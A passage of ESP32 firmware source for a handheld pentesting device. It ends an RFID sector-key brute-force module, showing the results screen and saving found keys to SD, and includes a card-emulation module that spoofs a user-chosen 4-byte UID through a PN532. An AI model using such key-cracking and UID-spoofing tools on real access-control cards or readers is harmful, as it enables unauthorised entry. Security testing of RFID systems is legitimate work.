                if (bruteSector >= bruteTotalSectors) {
                    bruteDone = true;
                    bruteRunning = false;
                }
            }
            frameReady = true;
        }
    }
#endif

    // Results screen — handle scroll and wait for BACK
    if (resultsShown) {
        int maxVisible = (SCROLL_BAR_Y - BRT_DATA_Y) / SCROLL_ROW_H;
        if (handleScrollTouch(scrollOffset, bruteTotalSectors, maxVisible)) {
            drawBrutePage();
        }
        delay(30);
        return;
    }

    // Results display — runs once when brute force completes
    if (bruteDone && !resultsShown) {
        resultsShown = true;
        scrollOffset = 0;

        // Fill progress bar to 100%
        int barW = SCREEN_WIDTH - 40;
        drawGradientBar(20, BRT_BAR_Y, barW, BRT_BAR_H, barW);

        // Update progress text to final status
        tft.fillRect(10, BRT_PROGRESS_Y, SCREEN_WIDTH - 20, 28, TFT_BLACK);
        tft.setTextSize(TEXT_SIZE_BODY);
        tft.setTextColor(HALEHOUND_GREEN, TFT_BLACK);
        tft.setCursor(10, BRT_PROGRESS_Y);
        tft.printf("Done! %d keys found", foundCount);

        // Results section header
        tft.fillRect(0, BRT_RESULTS_Y - 4, SCREEN_WIDTH, SCREEN_HEIGHT - BRT_RESULTS_Y + 4, TFT_BLACK);
        drawRFIDSeparator(BRT_RESULTS_Y - 4);
        drawCenteredRFID(BRT_RESULTS_Y, "BRUTE FORCE COMPLETE", HALEHOUND_GREEN);

        // Draw first page of sector results
        drawBrutePage();

#if !RFID_DEMO_MODE
        saveKeysToSD();
        delay(50);
        pn532Cleanup();
#endif

        Serial.printf("[BRUTE] Complete — %d keys found. Waiting for user.\n", foundCount);
        return;
    }

    // Progress display — only visible in demo mode or if using Core 0 task
    if (bruteRunning) {
        tft.fillRect(10, BRT_PROGRESS_Y, SCREEN_WIDTH - 20, 14, TFT_BLACK);
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(10, BRT_PROGRESS_Y);
        tft.printf("Sector: %d/%d  Key: %d/%d", bruteSector + 1, bruteTotalSectors, bruteKeyIdx + 1, NUM_BRUTE_KEYS);

        tft.fillRect(10, BRT_PROGRESS_Y + 14, SCREEN_WIDTH - 20, 12, TFT_BLACK);
        tft.setTextColor(foundCount > 0 ? rfidPulseColor(millis()) : HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(10, BRT_PROGRESS_Y + 14);
        tft.printf("Found: %d keys", foundCount);

        int barW = SCREEN_WIDTH - 40;
        int totalWork = bruteTotalSectors * NUM_BRUTE_KEYS;
        int currentWork = bruteSector * NUM_BRUTE_KEYS + bruteKeyIdx;
        int fillW = totalWork > 0 ? (currentWork * barW) / totalWork : 0;
        drawGradientBar(20, BRT_BAR_Y, barW, BRT_BAR_H, fillW);

        frameReady = false;
    }
}

void cleanup() {
    bruteRunning = false;
    if (bruteTaskHandle) {
        // Wait for task to exit cleanly
        for (int i = 0; i < 50; i++) {
            if (!bruteTaskHandle) break;
            delay(10);
        }
        bruteTaskHandle = NULL;
    }
    pn532Cleanup();
    exitRequested = false;
}

bool isExitRequested() {
    return exitRequested;
}

} // namespace RFIDBrute

// ═══════════════════════════════════════════════════════════════════════════
// RFID EMULATE — Card emulation using PN532 target mode
// ═══════════════════════════════════════════════════════════════════════════

namespace RFIDEmulate {

static bool exitRequested = false;

// Emulated UID
static uint8_t emulUid[4] = {0xDE, 0xAD, 0xBE, 0xEF};
static bool emulating = false;

// Hex keyboard state
static int hexCursor = 0;
static int hexNibble = 0;

// Y positions for Emulate layout
#define EMU_TITLE_Y      55
#define EMU_SEP_Y        68
#define EMU_UID_Y        82
#define EMU_BTN_Y        110
#define EMU_EMU_BTN_Y    170
#define EMU_STATUS_Y     208
#define EMU_READER_Y     (SCREEN_HEIGHT - 40)

// Button geometry
#define EMU_ARROW_W      50
#define EMU_ARROW_H      28
#define EMU_EMU_W        140
#define EMU_EMU_H        32

// Touch debounce
static unsigned long emuLastTouch = 0;
static const unsigned long EMU_TOUCH_MS = 200;

static void drawUidDisplay() {
    int y = EMU_UID_Y;

    // Clear UID area
    tft.fillRect(8, y - 5, SCREEN_WIDTH - 16, 24, TFT_BLACK);

    // UID display in rounded frame
    tft.drawRoundRect(8, y - 4, SCREEN_WIDTH - 16, 22, 3, HALEHOUND_VIOLET);
    tft.drawRoundRect(9, y - 3, SCREEN_WIDTH - 18, 20, 2, HALEHOUND_GUNMETAL);

    tft.setTextSize(TEXT_SIZE_BODY);
    tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(14, y);
    tft.print("UID: ");

    for (int i = 0; i < 4; i++) {
        if (i == hexCursor) {
            tft.setTextColor(TFT_BLACK, HALEHOUND_HOTPINK);
        } else {
            tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
        }
        tft.printf("%02X", emulUid[i]);
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        if (i < 3) tft.print(":");
    }
}

static void drawArrowButton(int x, int y, int w, int h, const char* label, uint16_t color) {
    tft.fillRoundRect(x, y, w, h, 4, HALEHOUND_DARK);
    tft.drawRoundRect(x, y, w, h, 4, color);
    tft.setTextSize(TEXT_SIZE_BODY);
    tft.setTextColor(color);
    int tw = strlen(label) * TEXT_CHAR_W;
    tft.setCursor(x + (w - tw) / 2, y + (h - 8) / 2);
    tft.print(label);
}

static void drawEmulateButtons() {
    int midX = SCREEN_WIDTH / 2;

    // Row 1: LEFT / UP / DOWN / RIGHT
    int row1Y = EMU_BTN_Y;
    int gap = 6;
    int totalW = EMU_ARROW_W * 4 + gap * 3;
    int startX = (SCREEN_WIDTH - totalW) / 2;

    drawArrowButton(startX,                          row1Y, EMU_ARROW_W, EMU_ARROW_H, "< L", HALEHOUND_VIOLET);
    drawArrowButton(startX + EMU_ARROW_W + gap,      row1Y, EMU_ARROW_W, EMU_ARROW_H, "UP",  HALEHOUND_CYAN);
    drawArrowButton(startX + (EMU_ARROW_W + gap) * 2, row1Y, EMU_ARROW_W, EMU_ARROW_H, "DN",  HALEHOUND_CYAN);
    drawArrowButton(startX + (EMU_ARROW_W + gap) * 3, row1Y, EMU_ARROW_W, EMU_ARROW_H, "R >", HALEHOUND_VIOLET);

    // Row 2: +16 / -16 (fast scroll full byte)
    int row2Y = row1Y + EMU_ARROW_H + 6;
    int halfW = (SCREEN_WIDTH - 30) / 2;
    drawArrowButton(10,            row2Y, halfW, EMU_ARROW_H, "+16", HALEHOUND_MAGENTA);
    drawArrowButton(10 + halfW + 10, row2Y, halfW, EMU_ARROW_H, "-16", HALEHOUND_MAGENTA);

    // EMULATE / STOP button
    int emuX = (SCREEN_WIDTH - EMU_EMU_W) / 2;
    if (emulating) {
        tft.fillRoundRect(emuX, EMU_EMU_BTN_Y, EMU_EMU_W, EMU_EMU_H, 5, HALEHOUND_HOTPINK);
        tft.setTextColor(TFT_BLACK);
        tft.setTextSize(TEXT_SIZE_BODY);
        int tw = 4 * TEXT_CHAR_W; // "STOP"
        tft.setCursor(emuX + (EMU_EMU_W - tw) / 2, EMU_EMU_BTN_Y + (EMU_EMU_H - 8) / 2);
        tft.print("STOP");
    } else {
        tft.fillRoundRect(emuX, EMU_EMU_BTN_Y, EMU_EMU_W, EMU_EMU_H, 5, HALEHOUND_GREEN);
        tft.setTextColor(TFT_BLACK);
        tft.setTextSize(TEXT_SIZE_BODY);
        int tw = 7 * TEXT_CHAR_W; // "EMULATE"
        tft.setCursor(emuX + (EMU_EMU_W - tw) / 2, EMU_EMU_BTN_Y + (EMU_EMU_H - 8) / 2);
        tft.print("EMULATE");
    }
}

static void drawEmulateStatus() {
    tft.fillRect(0, EMU_STATUS_Y - 6, SCREEN_WIDTH, SCREEN_HEIGHT - EMU_STATUS_Y + 6, TFT_BLACK);
    drawRFIDSeparator(EMU_STATUS_Y - 6);

    if (emulating) {
        drawCenteredRFID(EMU_STATUS_Y, "EMULATING...", HALEHOUND_GREEN);
        drawCenteredRFID(EMU_STATUS_Y + 16, "Waiting for reader", HALEHOUND_MAGENTA);

        int cx = SCREEN_WIDTH / 2;
        int cy = EMU_STATUS_Y + 46;
        for (int r = 0; r < 3; r++) {
            uint16_t col = rfidGradientColor((float)r / 3.0f);
            tft.drawCircle(cx, cy, 10 + r * 12, col);
            tft.drawCircle(cx, cy, 11 + r * 12, col);
        }
    } else {
        drawCenteredRFID(EMU_STATUS_Y, "Ready to emulate", HALEHOUND_GUNMETAL);
    }
}

static void drawEmulateUI() {
    drawUidDisplay();
    drawEmulateButtons();
    drawRFIDSeparator(EMU_STATUS_Y - 6);
    drawEmulateStatus();
}

static void handleEmulateTouch() {
    if (!isTouched()) return;
    if (millis() - emuLastTouch < EMU_TOUCH_MS) return;

    int tx = getTouchX();
    int ty = getTouchY();
    if (tx < 0 || ty < 0) return;

    emuLastTouch = millis();

    // Row 1: LEFT / UP / DOWN / RIGHT
    int gap = 6;
    int totalW = EMU_ARROW_W * 4 + gap * 3;
    int startX = (SCREEN_WIDTH - totalW) / 2;

    if (ty >= EMU_BTN_Y && ty <= EMU_BTN_Y + EMU_ARROW_H) {
        // LEFT
        if (tx >= startX && tx <= startX + EMU_ARROW_W) {
            hexCursor = (hexCursor > 0) ? hexCursor - 1 : 3;
            drawUidDisplay();
            waitForTouchRelease();
            return;
        }
        // UP (+1)
        if (tx >= startX + EMU_ARROW_W + gap && tx <= startX + EMU_ARROW_W * 2 + gap) {
            emulUid[hexCursor]++;
            drawUidDisplay();
            waitForTouchRelease();
            return;
        }
        // DOWN (-1)
        if (tx >= startX + (EMU_ARROW_W + gap) * 2 && tx <= startX + EMU_ARROW_W * 3 + gap * 2) {
            emulUid[hexCursor]--;
            drawUidDisplay();
            waitForTouchRelease();
            return;
        }
        // RIGHT
        if (tx >= startX + (EMU_ARROW_W + gap) * 3 && tx <= startX + EMU_ARROW_W * 4 + gap * 3) {
            hexCursor = (hexCursor < 3) ? hexCursor + 1 : 0;
            drawUidDisplay();
            waitForTouchRelease();
            return;
        }
    }

    // Row 2: +16 / -16
    int row2Y = EMU_BTN_Y + EMU_ARROW_H + 6;
    int halfW = (SCREEN_WIDTH - 30) / 2;
    if (ty >= row2Y && ty <= row2Y + EMU_ARROW_H) {
        // +16
        if (tx >= 10 && tx <= 10 + halfW) {
            emulUid[hexCursor] += 16;
            drawUidDisplay();
            waitForTouchRelease();
            return;
        }
        // -16
        if (tx >= 10 + halfW + 10 && tx <= 10 + halfW * 2 + 10) {
            emulUid[hexCursor] -= 16;
            drawUidDisplay();
            waitForTouchRelease();
            return;
        }
    }

    // EMULATE / STOP button
    int emuX = (SCREEN_WIDTH - EMU_EMU_W) / 2;
    if (tx >= emuX && tx <= emuX + EMU_EMU_W && ty >= EMU_EMU_BTN_Y && ty <= EMU_EMU_BTN_Y + EMU_EMU_H) {
        emulating = !emulating;

        if (emulating) {
            // Configure PN532 as target with our UID
            uint8_t command[] = {
                0x00, 0x00,                                   // SENS_RES
                emulUid[0], emulUid[1], emulUid[2],          // NFCID1 (3 bytes)
                0x40                                          // SEL_RES (0x40 = tag emulation)
            };
            nfc.setPassiveActivationRetries(0xFF);
            nfc.SAMConfig();
            Serial.printf("[RFID] Emulating UID: %02X:%02X:%02X:%02X\n",
                          emulUid[0], emulUid[1], emulUid[2], emulUid[3]);
        } else {
            Serial.println("[RFID] Emulation stopped");
        }

        drawEmulateButtons();
        drawEmulateStatus();
        waitForTouchRelease();
        return;
    }
}

void setup() {
    exitRequested = false;
    emulating = false;
    hexCursor = 0;
    hexNibble = 0;

    tft.fillScreen(TFT_BLACK);
    drawRFIDIconBar("Card Emulate");
    drawRFIDTitle(EMU_TITLE_Y, "EMULATOR");
    drawRFIDSeparator(EMU_SEP_Y);

    tft.setTextSize(TEXT_SIZE_BODY);

    if (!pn532Init()) {
        drawCenteredRFID(EMU_UID_Y, "PN532 NOT FOUND!", HALEHOUND_HOTPINK);
        drawCenteredRFID(EMU_UID_Y + 18, "Tap BACK to exit", HALEHOUND_GUNMETAL);
        return;
    }

    drawEmulateUI();
}

void loop() {
    if (exitRequested) return;

    // Always handle touch (buttons work in both idle and emulating states)
    handleEmulateTouch();

    if (emulating) {
        // Pulsing EMULATING text
        static unsigned long lastPulse = 0;
        if (millis() - lastPulse > 200) {
            lastPulse = millis();
            tft.fillRect(10, EMU_STATUS_Y, SCREEN_WIDTH - 20, 12, TFT_BLACK);
            tft.setTextColor(rfidPulseColor(millis()), TFT_BLACK);
            int tw = TEXT_CHAR_W * 12;
            tft.setCursor((SCREEN_WIDTH - tw) / 2, EMU_STATUS_Y);
            tft.print("EMULATING...");
        }

#if RFID_DEMO_MODE
        // Demo: simulate a reader detection after 5 seconds
        static unsigned long emulDemoStart = 0;
        static bool emulDemoTriggered = false;
        if (emulDemoStart == 0) emulDemoStart = millis();

        if (!emulDemoTriggered && millis() - emulDemoStart > 5000) {
            emulDemoTriggered = true;

            drawCardFlash();

            tft.fillRect(10, EMU_READER_Y, SCREEN_WIDTH - 20, 32, TFT_BLACK);
            tft.setTextColor(HALEHOUND_GREEN, TFT_BLACK);
            tft.setCursor(10, EMU_READER_Y);
            tft.print("Reader detected!");
            tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
            tft.setCursor(10, EMU_READER_Y + 14);
            tft.print("Recv: 7 bytes (demo)");
            Serial.println("[RFID] Emulation DEMO: simulated reader contact");
        }
#else
        uint8_t result = nfc.AsTarget();

        if (result) {
            uint8_t cmd[64];
            uint8_t cmdLen = sizeof(cmd);
            uint8_t status = nfc.getDataTarget(cmd, &cmdLen);

            drawCardFlash();

            tft.fillRect(10, EMU_READER_Y, SCREEN_WIDTH - 20, 32, TFT_BLACK);
            tft.setTextColor(HALEHOUND_GREEN, TFT_BLACK);
            tft.setCursor(10, EMU_READER_Y);
            tft.print("Reader detected!");
            tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
            tft.setCursor(10, EMU_READER_Y + 14);
            if (status) {
                tft.printf("Recv: %d bytes", cmdLen);
                Serial.printf("[RFID] Emulation: reader sent %d bytes\n", cmdLen);
            } else {
                tft.print("Activated (no data)");
                Serial.println("[RFID] Emulation: reader activated, no data");
            }
        }
#endif
    }
}

void cleanup() {
    emulating = false;
    pn532Cleanup();
    exitRequested = false;
}

bool isExitRequested() {
    return exitRequested;
}

} // namespace RFIDEmulate

#endif // CYD_HAS_PN532
